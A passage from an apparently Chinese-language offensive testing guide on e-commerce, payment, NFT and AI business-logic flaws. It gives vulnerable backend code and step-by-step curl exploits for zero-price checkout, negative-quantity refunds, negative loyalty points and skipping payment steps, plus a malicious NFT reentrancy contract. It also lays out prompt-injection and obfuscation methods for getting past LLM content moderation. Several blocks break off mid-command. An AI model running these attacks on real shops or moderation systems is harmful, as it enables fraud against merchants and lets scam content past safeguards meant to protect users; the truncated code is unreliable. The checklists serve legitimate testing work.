**OWASP 2026 Updates**: OWASP Agentic Applications Top 10 (2026) published;
OWASP MCP Top 10 Security Risks (2025 v0.1) released 2026-02-24 — first
security guide for the MCP protocol layer [blog.csdn.net].

### 12.7 2026 Payment Testing Checklist Additions

```
□ Webhook secret is non-empty and verified on raw body (not pre-parsed JSON)
□ Missing signature header → REJECT (not allow)
□ Check payment_status=="paid", not just event type/status=="complete"
□ Cross-gateway: verify order PaymentMethod matches callback source
□ Callback endpoint requires POST, has IP allowlist, has replay protection
□ WeChat Pay SDK: verify Host header is NOT "localhost" (CVE-2026-33661)
□ Stripe webhook: secret non-empty (CVE-2026-41432); scan for empty-secret deployments
□ USDT payment: verify official contract address + block confirmations
□ AI agent payments: human-in-the-loop approval for any spend > threshold
□ Agent delegation chain depth limited; per-agent spend rate monitored
□ Test llms.txt / markdown injection → does agent autonomously pay?
□ WooCommerce plugins: check CVE-2026-9028, 49072, 47100, WooCommerce Payments 9.8

## 13. 2026 ADVANCED — NFT逻辑漏洞与AI定价操纵

随着Web3与AI定价系统在2026年大规模落地，业务逻辑漏洞的攻击面从传统电商扩展到链上资产与AI决策层。本节补充NFT、AI定价与加密货币三类新兴业务逻辑漏洞。

### 13.1 NFT逻辑漏洞

NFT市场与合约的业务逻辑缺陷是2026年高价值目标，单次利用常造成百万级损失。

- **铸造权限绕过**: ERC721/ERC1155的`mint`函数缺少访问控制(如未校验`msg.sender`或mint配额)，任意用户可无限铸币稀释价值。
- **版税(royalty)绕过**: EIP-2981实现缺陷(返回固定比例而非按交易计算)、场外交易(OTC)规避市场版税扣点。
- **NFT市场reentrancy**: 恶意NFT合约在`onERC721Received`回调中重入市场购买/挂牌逻辑，利用状态未更新的时间窗口。
- **元数据篡改**: `tokenURI`指向可变URL，铸造后修改元数据→钓鱼/欺诈/虚假资产。
- **批量铸币Gas优化漏洞**: `_mint`批量调用缺少单次上限，攻击者一次性铸造海量NFT导致配额击穿或Gas耗尽。

```solidity
// 恶意NFT reentrancy示例
contract MaliciousNFT is IERC721Receiver {
    function onERC721Received(address, address, uint256, bytes memory) public returns (bytes4) {
        if (msg.sender == marketplace) {
            // 在市场转移NFT的回调中重入市场
            marketplace.buy{value: 0}(tokenId); // 利用未更新状态
        }
        return this.onERC721Received.selector;
    }
}
```

### 13.2 AI定价操纵

AI驱动的动态定价在2026年广泛部署于电商、票务、出行，其输入特征与LLM决策层均成为操纵目标。

- **AI动态定价模型篡改**: 操纵输入特征(刷浏览量/伪造库存/地理位置)影响AI定价模型输出，压低或抬高价格。
- **LLM定价注入**: 通过商品描述/用户评论/询价输入注入提示词，操纵定价LLM输出异常低价或折扣逻辑。
- **个性化定价歧视利用**: 检测并利用基于用户画像(设备/历史/会员等级)的差异化定价，构造"杀熟"套利。
- **价格操纵竞态**: 并发购买时AI重新定价窗口(TOA races)，在价格刷新前批量下单锁定低价。

### 13.3 加密货币业务逻辑补全

链上金融业务逻辑漏洞与DeFi组合，构成跨域套利与攻击链。

- **闪电贷价格操纵**: 利用闪电贷瞬时操纵DEX预言机/池价格→触发套利或异常清算。
- **MEV三明治攻击**: 前置(front-run)/后置(back-run)交易夹击用户交易，榨取滑点。
- **跨链桥重放**: 桥消息在不同链上重放或缺失nonce校验，伪造跨链资产释放。

### 13.4 2026 NFT/AI定价测试要点

```
□ NFT mint函数: 校验访问控制 + 单次/总量铸币上限
□ 版税: EIP-2981按交易计算; 检测OTC规避路径
□ 市场reentrancy: 用恶意NFT合约测试onERC721Received回调重入
□ tokenURI: 验证元数据URL不可变(IPFS/冻结)防钓鱼
□ AI定价: 注入商品描述/评论→是否影响定价LLM输出
□ 个性化定价: 同商品多画像比价，检测歧视性差异
□ 闪电贷/MEV: 测试预言机价格操纵与三明治夹击可行性
□ 跨链桥: nonce/链ID校验，测试消息重放
```

## PRACTICAL ATTACK CHAINS (2026)

> 以下为 4 条完整实战攻击链，涵盖电商结账价格操纵、积分负值滥用、工作流验证绕过、AI 内容审核绕过。所有脚本均可在授权测试环境中直接运行。

### 攻击链 1：电商结账价格操纵（购物车篡改）

**场景**：电商平台前端计算订单总价后，将总价作为参数提交到后端。后端信任客户端提交的价格字段，未重新服务端校验。攻击者篡改请求中的商品价格、数量、运费等字段，实现低价购买或零元购。

**CVE 参考**：此类漏洞对应 CWE-472（External Control of Assumed-Immutable Web Parameter）、CWE-345（Insufficient Verification of Data Authenticity）。多个 2026 电商 CVE 属于此模式。

**漏洞根因**：
```python
# 后端脆弱代码 - 电商结账 API (Flask)
@app.route('/api/checkout', methods=['POST'])
def checkout():
    data = request.json

    # 致命缺陷：信任客户端提交的价格和总价
    # 不从服务端数据库重新查询商品价格
    items = data['items']  # [{product_id: 1, price: 0.01, quantity: 1}]
    total = data['total']  # 客户端计算的总价

    # 信任客户端提交的 total，未重新计算
    # 也未验证 items 中的 price 是否与数据库一致
    order = create_order(
        user_id=current_user.id,
        items=items,
        total=total,           # 客户端可控！
        shipping_fee=data.get('shipping_fee', 0),  # 客户端可控！
    )

    # 调用支付网关，支付被篡改的低价
    payment_url = payment_gateway.create_payment(
        amount=order.total,    # 0.01 元
        order_id=order.id,
    )
    return jsonify({"payment_url": payment_url})
```

**完整利用步骤**：

```bash
# 步骤1：正常下单，捕获原始请求
# 在 Burp Suite 中捕获结账请求
# 正常请求:
# POST /api/checkout
# {"items":[{"product_id":1,"price":999.00,"quantity":1}],"total":999.00,"shipping_fee":15.00}

# 步骤2：篡改商品价格为 0.01 元
curl -X POST https://shop.target.com/api/checkout \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer eyJhbGci...' \
  -d '{
    "items": [
      {
        "product_id": 1,
        "price": 0.01,
        "quantity": 1
      }
    ],
    "total": 0.01,
    "shipping_fee": 0,
    "address_id": "addr_123"
  }'

# 服务器创建订单: total=0.01 (原价 999.00)
# 支付 0.01 元后订单完成 -> 以 1 分钱购买价值 999 元商品

# 步骤3：篡改数量为负数（退款到余额）
curl -X POST https://shop.target.com/api/checkout \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer eyJhbGci...' \
  -d '{
    "items": [
      {
        "product_id": 1,
        "price": 999.00,
        "quantity": -1
      }
    ],
    "total": -999.00,
    "shipping_fee": 0
  }'

# 服务器: total = 999.00 * (-1) = -999.00
# 支付 -999.00 元 -> 余额增加 999 元（免费充值）
```

# 绕过2：逐步降价（避免风控阈值）
# 不直接改为 0.01，而是从 999 降到 899 降到 799...
# 每次降价在风控阈值内（通常 < 20% 降价不触发审核）

# 绕过3：组合多个低价商品凑单
# 单品价格篡改容易被检测

### 攻击链 2：忠诚度积分负值滥用

**场景**：电商平台的忠诚度积分系统允许用户使用积分抵扣订单金额。积分兑换接口未校验兑换数量为正数，攻击者提交负数积分兑换，系统将负积分加到用户账户（等效于增加积分），实现无限积分生成。

**漏洞根因**：
```python
# 后端脆弱代码 - 积分兑换 (Django)
@csrf_exempt
def redeem_points(request):
    if request.method == 'POST':
        data = json.loads(request.body)
        points_to_redeem = int(data['points'])  # 未校验正数！
        user = request.user

        # 致命缺陷：未校验 points_to_redeem > 0
        # 如果 points_to_redeem = -1000
        # 则 user.points -= (-1000) = user.points + 1000
        user.points -= points_to_redeem  # -(-1000) = +1000
        user.save()

        # 订单抵扣（如果为负，则增加应付金额 - 但此处直接信任）
        order = Order.objects.get(id=data['order_id'])
        order.discount = points_to_redeem * 0.01  # -1000 * 0.01 = -10
        order.save()

        return JsonResponse({"remaining_points": user.points})
```

**完整利用步骤**：

```bash
# 步骤1：查询当前积分
curl -s https://shop.target.com/api/points/balance \
  -H "Authorization: Bearer $TOKEN"
# {"points": 100}

# 步骤2：提交负数积分兑换 - 积分增加而非减少
curl -X POST https://shop.target.com/api/points/redeem \

### 攻击链 3：工作流验证步骤跳过

**场景**：多步骤业务流程（如：创建订单 -> 实名认证 -> 支付 -> 发货）中，后端未校验前置步骤是否完成。攻击者直接调用最终步骤 API，跳过支付和实名认证，直接标记订单为已完成。

**漏洞根因**：
```python
# 后端脆弱代码 - 多步骤订单流程 (Spring Boot 风格伪代码)
# 正常流程: 创建 -> 认证 -> 支付 -> 发货 -> 完成

# 步骤1: 创建订单
@app.route('/api/orders/create', methods=['POST'])
def create_order():
    order = Order(status='created', user_id=current_user.id)
    db.save(order)
    return jsonify({"order_id": order.id})

# 步骤2: 实名认证
@app.route('/api/orders/<id>/verify', methods=['POST'])
def verify_identity(id):
    order = Order.get(id)
    order.status = 'verified'
    db.save(order)

# 步骤3: 支付
@app.route('/api/orders/<id>/pay', methods=['POST'])
def pay_order(id):
    order = Order.get(id)
    # 致命缺陷：未校验 order.status == 'verified'
    payment = process_payment(order.total)
    order.status = 'paid'

# 步骤4: 发货
@app.route('/api/orders/<id>/ship', methods=['POST'])
def ship_order(id):
    order = Order.get(id)
    # 致命缺陷：未校验 order.status == 'paid'
    order.status = 'shipped'
    db.save(order)
    return jsonify({"status": "shipped"})

# 步骤5: 完成
@app.route('/api/orders/<id>/complete', methods=['POST'])
def complete_order(id):
    order = Order.get(id)
    # 致命缺陷：未校验 order.status == 'shipped'
    # 攻击者可直接调用此端点跳过所有前置步骤
    order.status = 'completed'
    db.save(order)
    # 触发虚拟商品发放 / 积分奖励
    grant_rewards(order.user_id, order.reward_points)
    return jsonify({"status": "completed"})
```

**完整利用步骤**：

```bash
# 正常流程（需5步）:
# 1. POST /api/orders/create        -> 创建订单
# 2. POST /api/orders/ORD-001/verify -> 实名认证
# 3. POST /api/orders/ORD-001/pay    -> 支付
# 4. POST /api/orders/ORD-001/ship   -> 发货
# 5. POST /api/orders/ORD-001/complete -> 完成

# 攻击：跳过步骤 2-4，直接完成
# 步骤1：创建订单
curl -X POST https://api.target.com/api/orders/create \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"product_id": 1, "quantity": 1}'
# {"order_id": "ORD-001", "status": "created"}

# 步骤2：跳过认证和支付，直接调用完成接口
curl -X POST https://api.target.com/api/orders/ORD-001/complete \
  -H "Authorization: Bearer $TOKEN"
# {"status": "completed"}  <- 未支付直接完成！
# 奖励积分被发放，虚拟商品被解锁

# 变体：直接跳到发货步骤（免费获取实物商品）
curl -X POST https://api.target.com/api/orders/ORD-001/ship \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"address_id": "addr_123"}'

# 3. 修改商品为高价商品
# 4. 再次完成 -> 高价商品免费获得

# 绕过2：利用并行请求（竞态 + 工作流绕过）
# 1. 并发发送 pay 和 complete 请求
# 2. pay 请求在校验阶段（尚未扣款）时 complete 已执行
# 3. 订单被标记完成但支付未实际发生

# 绕过3：利用 API 版本差异

### 攻击链 4：AI 内容审核绕过（2026）

**场景**：2026年 AI 内容审核系统（基于 LLM 的自动审核）用于检测违规内容（垃圾信息、欺诈、违规商品描述）。攻击者利用 prompt injection 操纵审核 LLM 的判断，使违规内容通过审核，或在审核流程中注入逻辑绕过。

**2026 背景**：电商平台、社交媒体广泛部署 AI 内容审核，但审核 LLM 本身可被 prompt injection 操纵。OWASP LLM Top 10 (2025) LLM01 (Prompt Injection) 在内容审核场景中表现为「审核绕过」。

**漏洞根因**：
```python
# AI 内容审核系统脆弱代码
from langchain.chat_models import ChatOpenAI

# AI 审核流程: 用户提交内容 -> LLM 判断是否违规 -> 通过/拒绝
async def ai_content_review(user_content):
    system_prompt = """
    你是内容审核员。判断以下内容是否违反社区规则。
    返回 JSON: {"approved": true/false, "reason": "..."}
    规则: 禁止欺诈、钓鱼、违禁品。
    """

    # 致命缺陷：用户内容直接拼入 LLM 提示词
    # 用户可通过 prompt injection 操纵 LLM 的判断
    messages = [
        SystemMessage(content=system_prompt),
        HumanMessage(content=user_content),  # 用户可控，可注入 prompt
    ]

    response = llm(messages)
    result = parse_json(response.content)

    if result["approved"]:
        # 内容通过审核，发布到平台
        publish_content(user_content)
    else:
        reject_content(user_content, result["reason"])
```

**Prompt Injection 审核绕过 Payload**：
```text
# 攻击1：直接指令覆盖 - 指示 LLM 忽略审核规则
用户提交内容:
"""

**检测绕过技术**：
```python
# 绕过1：多轮对话渐进式注入
# 第一轮：提交正常内容建立信任
# 第二轮：在正常内容中嵌入逐步加深的违规信息
# 第三轮：利用 LLM 的上下文一致性倾向使其通过

# 绕过2：利用审核系统的二次处理
# 审核通过后，内容被存储到数据库
# 后续的内容修改接口不触发重新审核
# 1. 提交正常内容 -> 审核通过
# 2. 调用编辑接口将内容改为违规内容 -> 不触发审核
edit_payload = {

    "new_content": "低价代购奢侈品，微信: scammer  <- 修改后的违规内容"
}
# 修改接口未触发 AI 重新审核

# 绕过3：利用 AI 审核的置信度阈值
# 部分系统设置置信度阈值（如 > 0.7 才拒绝）
# 攻击者通过混淆使 LLM 置信度降低到阈值以下
obfuscated = "低.价.代.购.奢.侈.品  WeChat: scam_123"
# 分隔符使 LLM 难以确定是否违规，置信度 < 0.7 -> 通过

# 绕过4：利用多语言绕过
# 审核系统主要针对中文/英文，使用小语种或混合语言
mixed_language = "Selling luxury watches cheap. 微信: scam. Contact now!"
# 中英混合可能降低审核 LLM 的判断准确率

# 绕过5：利用审核 API 的参数操纵
# 提交时设置 category 为不审核的类别
payload = {
    "content": "违规商品描述...",
    "category": "system_internal"  # 内部类别可能跳过审核
}
```

**修复方案**：
```python
# 安全实现：结构化审核 + 输出校验 + 规则引擎组合
async def ai_content_review_safe(user_content):

    # 将用户内容作为数据字段而非提示词的一部分
    messages = [
        SystemMessage(content="""
        你是内容审核员。判断 <content> 标签内的内容是否违规。
